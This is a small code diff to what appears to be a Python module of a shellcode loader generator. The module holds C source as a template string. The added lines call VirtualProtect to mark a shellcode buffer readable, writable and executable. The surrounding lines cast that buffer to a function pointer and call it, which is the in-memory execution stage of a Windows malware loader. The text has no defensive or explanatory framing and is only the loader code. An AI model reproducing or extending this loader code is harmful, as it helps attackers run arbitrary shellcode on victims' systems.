@@ -3,6 +3,10 @@ def desc():
 
 def run():
     execution = '''\
+    // Making it executable
+    DWORD dwOldProtection = NULL;
+    VirtualProtect(pShellcode, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection);
+    
     typedef VOID (WINAPI* fnShellcodefunc)();
     fnShellcodefunc pShell = (fnShellcodefunc) pShellcode;
     pShell();
